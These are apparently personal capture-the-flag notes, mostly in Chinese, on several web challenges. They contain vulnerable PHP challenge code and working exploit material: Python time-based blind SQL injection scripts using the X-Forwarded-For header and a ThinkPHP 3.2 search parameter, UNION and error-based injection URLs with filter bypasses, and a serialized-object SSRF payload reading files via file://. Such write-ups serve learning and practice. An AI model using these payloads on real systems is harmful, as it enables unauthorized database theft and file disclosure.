		$page = $_GET['page'];
	}
	if (stripos($page, './') > 0) {
		die('no ./ ./ ./ ./');
	}
	if (stripos($page, '://') > 0) {
		die('no :// :// ://');
	}
	autoload($page);
	
	if (isset($_GET[admin]) && isset($_GET[file])) {
		if (stripos($_GET[admin], 'flag') > 0 || stripos($_GET[file], 'flag') > 0) {
			die('not flag flag flag falg !');
		}
	
		if (strlen($_GET[file]) >= 38) {
			die('too long');
		}
	
		download($_GET[admin], $_GET[file]);
	}

	?admin=php://input&file=includes/upload.php
	读到 upload.php 

	<?php
	if (stripos($_SERVER['QUERY_STRING'], 'flag') > 0) {
		die('no flag flag flag flag !');
	}

	if (!empty($_FILES)) {
	//properties of the uploaded file
		$name= $_FILES["filename"]["name"];
		$type= $_FILES["filename"]["type"];
		$size= $_FILES["filename"]["size"];
		$temp= $_FILES["filename"]["tmp_name"];
		$error= $_FILES["filename"]["error"];

		if (strlen($name) >= 6) {
			die('name is too long !');
		}

		if (stripos($name, './') > 0) {
			die('invalid parameter');
		}

		if (stripos($name, 'php') > 0) {
			die('invalid parameter');
		}

		if (substr($name, -3, 3) !== 'zip' && substr($name, -3, 3) !== 'jpg' && substr($name, -3, 3) !== 'png') {
			die('file can not upload ! ');
		}

		if ($error > 0) {
			die("Error uploading file! code $error.");
		} else {
			if ($type !== "application/zip" || $size > 400) {//condition for the file
				die("Format not allowed or file size too big!");
			} else {
				if (file_exists('includes')) {
					move_uploaded_file($temp, "includes/uploaded/" .$name);
					echo "Upload complete a!";
					shell_exec('sh /var/www/html/includes/unzip.sh');
				} elseif (file_exists('uploaded')) {
					move_uploaded_file($temp, "uploaded/" .$name);
					echo "Upload complete!";
					shell_exec('sh /var/www/html/includes/unzip.sh');
				}
			}
		}
	} else {
		if (isset($_GET['step']) && strlen($_GET['step']) === 20) {
			if (stripos($_GET['step'], 'lag') > 0) {
				die('error');
			}

			if (stripos($_GET['step'], './') > 0) {
				die('error');
			}

			if (stripos($_GET['step'], ' ') > 0) {
				die('error');
			}

			if (stripos($_GET['step'], '/') > 0) {
				die('error');
			}
			if (preg_match('/[^\w\d_ -]/si', $_GET['step'])) {
				$_GET['step'] = preg_replace('/[^a-zA-Z0-9_ -]/s', '', $_GET['step']);
				die('error');
			}
			passthru('cat ' . 'uploaded/' . $_GET['step']);
		} else {
			die();
		}
	}





# bugku insert into 注入题（XFF注入）
	关键代码
	<? php
	function getIp() {
		$ip = '';
		if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		$ip_arr = explode(',', $ip);
		return $ip_arr[0];
	}

	$ip = getIp();
	echo 'your ip is :'.$ip;
	$sql = "insert into client_ip (ip) values ('$ip')";
	mysql_query($sql);

	明显没有报错信息，没有回显，只能盲注
	还有一点，不能用逗号
	先手注得出数据库名和字段名，优先跑flag中的flag，再写脚本跑

	import requests
	import sys
	# 基于时间的盲注，过滤了逗号，使用 from x for 1 代替 x, 1
	sql = "127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)='{1}' then sleep(5) else 0 end))-- +"
	url = "http://123.206.87.240:8002/web15/"
	flag = ''
	for i in range(1, 40):
		print('正在猜测：', str(i))
		for ch in range(32, 129):
			if ch == 128:
				sys.exit(0)
			sqli = sql.format(i, chr(ch))
			# print(sqli)
			header = {
				'X-Forwarded-For': sqli
			}
			try:
				html = requests.get(url, headers=header, timeout=3)
			except:
				flag += chr(ch)
				print(flag)
				break

	# 打算改成二分，结果失败了，以后补
	import requests
	url = "http://123.206.87.240:8002/web15/"
	sql = "127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)>'{1}' then sleep(3) else 0 end))-- +"
	flag = ''
	for i in range(1, 40):
		print('正在猜测：', str(i))
		left = 31
		right = 129
		while left < right:
			mid = (left+right)//2
			temp = right
			sqli = sql.format(i, chr(mid))
			header = {
				'X-Forwarded-For': sqli
			}
			try:
				html = requests.get(url, headers=header, timeout=2)
				right = mid - 1
			except:
				left = mid
				right = temp
		flag += chr(left)
		print(flag)


# bugku 多次
	and 被替换，anandd 绕过
	数据库名长度为 9，名称 WEB1002-1
	|| length("and")=3  以此检测 and 是否被过滤
	或者 id = 1 ^ (length("and")=3)
	http://123.206.87.240:9004/1ndex.php
	order 被过滤，尝试 ordorderer，不行，因为 or 被过滤，还得双写 or，oorrder就可以了
	order by 2 正常，得出只查询两个字段
	ununionion seleselectct 1, 2%23 得到回显 2
	剩下就是常规套路，这里其实可以写 tamper 然后用 sqlmap 跑一下
	也可以盲注跑出数据库名，或者直接从 information_schema 得到数据
	?id=-1' ununionion seleselectct 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23
	注意 or 被过滤 得到 flag1，hint
	先查看 flag1 的内容
	?id=-1' ununionion seleselectct 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=0x666c616731%23
	得到 flag1、address
	?id=-1' ununionion seleselectct 1,flag1 from flag1%23
	得到 usOwycTju+FTUUzXosjr  
	?id=-1' ununionion seleselectct 1,address from flag1%23
	得到下一关地址
	进入下一关后，有明显的报错信息，尝试报错注入
	?id=0' and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)));%23
	得到 XPATH syntax error: '~class,flag2~'
	?id=0' and (extractvalue(1,concat(0x7e,(select flag2 from flag2),0x7e)));%23
	得到了一个假flag：flag{Bugku-sql_6s-2i-4t-bug}
	把 B 换成 b 就行了 ^==^


# bugku sql注入2
	御剑和脚本啥都没扫出来
	nikto -host http://123.206.87.240:8007/web2/
	OSVDB-6694: /web2/.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
	.DS_Store file // 再用脚本跑出目录


# Hack.lu-2017 Triangle
	结合 js 的逆向题
	wp:https://st98.github.io/diary/posts/2017-10-25-hacklu-ctf-2017.html


# fireshell 2019 Vice 
	<?php
	//require_once 'config.php';

	class SHITS{
		private $url;
		private $method;
		private $addr;
		private $host;
		private $name;

		function __construct($method,$url){
			$this->method = $method;
			$this->url = $url;
		}

		function doit(){
			
			$this->host = @parse_url($this->url)['host'];
			$this->addr = @gethostbyname($this->host);
			$this->name = @gethostbyaddr($this->host);
			if($this->addr !== "127.0.0.1" || $this->name === false){
			$not = ['.txt','.php','.xml','.html','.','[',']'];
			foreach($not as $ext){
				$p = strpos($this->url,$ext);
				if($p){
					die(":)");
				}
			}
			$ch = curl_init();
			curl_setopt($ch,CURLOPT_URL,$this->url);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

			$result = curl_exec($ch);
			echo $result;
			}else{
			die(":)");
			}
		}
		function __destruct(){
			if(in_array($this->method,array("doit"))){
		
			call_user_func_array(array($this,$this->method),array());
			}else{
			die(":)");
			}
		}
	}
	if(isset($_GET["gg"])) {
		@unserialize($_GET["gg"]);
	} else {
		highlight_file(__FILE__);
	}

	打开 config.php ， awn...
	猜想 config.php 有访问限制，构造 ssrf 访问，然而还是啥都没有

	$not = ['.txt','.php','.xml','.html','.','[',']'];
	foreach($not as $ext){
		$p = strpos($this->url,$ext);
		if($p){
			die(":)");
		}
	}

	此处可构造
	$gg = new SHITS('doit', '.php@68.183.31.62:991/config.php');
	$gg = new SHITS('doit', '.php@localhost/config.php');
	$gg = new SHITS('doit', 'localhost/config%2ephp');
	参考：https://www.secpulse.com/archives/65832.html
	$ser = serialize($gg);
	echo urlencode($ser) ."<br>";
	unserialize($ser);

	O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A32%3A%22.php%4068.183.31.62%3A991%2Fconfig.php%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D
	先编码，序列化后直接反序列化，此过程由于特殊符号编码会引起混乱，出现 unserialize(): Error at offset 错误
	也可以进行 base64 编码，但是需要改代码，这里利用 web 特性，url编码最方便

	但是并没有什么卵用

	还是得 file:///var/www/html/config%2ephp 二次编码绕过 . 
	读取 config.php O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D
	其实可以这样，不需要所有属性，只要前两个 O%3A5%3A%22SHITS%22%3A2%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3
	if($_SERVER['REMOTE_ADDR'] !== '::1' || $_SERVER['REMOTE_ADDR'] !== '127.0.0.1'){
		echo "aaawn";
	}else{
		$flag ="F#{wtf_5trp0s_}";
	}


# tinyCTF 2014: NaNNaNNaNNaN…, Batman!
	<script>
	_ = 'function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){	[0]);.splice(0,1)}}}	\'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["	write(s[o%4]buttonif(e.ment';
	for(Y in $='	')
		with(_.split($[Y])) 
			_=join(pop());
	eval(_)
	</script>
	将 eval 换成 console.log(_)
	得到
	function $() {
		var e = document.getElementById("c").value;
		if (e.length == 16)
			if (e.match(/^be0f23/) != null)
				if (e.match(/233ac/) != null)
					if (e.match(/e98aa$/) != null)
						if (e.match(/c7be9/) != null) {
							var t = ["fl", "s_a", "i", "e}"];
							var n = ["a", "_h0l", "n"];
							var r = ["g{", "e", "_0"];
							var i = ["it'", "_", "n"];
							var s = [t, n, r, i];
							for (var o = 0; o < 13; ++o) {
								document.write(s[o % 4][0]);
								s[o % 4].splice(0, 1)
							}
						}
	}
	document.write('<input id="c"><button onclick=$()>Ok</button>');
	delete _
	直接执行中间那部分即可得到flag


# 安恒杯一月赛
	simple php
	1.SQL约束攻击
	2.tp3.2 sql注入
	https://www.anquanke.com/post/id/170341#h3-3
	发现是搜索框，并且是tp3.2
	不难想到注入漏洞，随手尝试报错id

	http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(id)--
	发现库名tpctf，表名flag，根据经验猜测字段名是否为flag

	http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(flag)--
	nice，发现flag字段也存在，省了不少事
	
	下面是思考如何注入得到数据,随手测试

	http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if(1,sleep(3),0)--

	发现成功sleep 3s,轻松写出exp

	import requests
	flag = ''
	cookies = {
		'PHPSESSID': 're4g49sil8hfh4ovfrk7ln1o02'
	}
	for i in range(1,33):
		for j in '0123456789abcdef':
			url = 'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'+str(i)+',1))='+str(ord(j))+'),sleep(3),0)--'
			try:
				r = requests.get(url=url,timeout=2.5,cookies=cookies)
			except:
				flag += j
				print flag
				break


	tp 这几个漏洞还搞不清楚
	https://xz.aliyun.com/t/2812#toc-11
	https://www.anquanke.com/post/id/157817
	https://www.secpulse.com/archives/29826.html
	https://bbs.ichunqiu.com/thread-38901-1-1.html
	先缓缓吧，phpstudy里已经搭好环境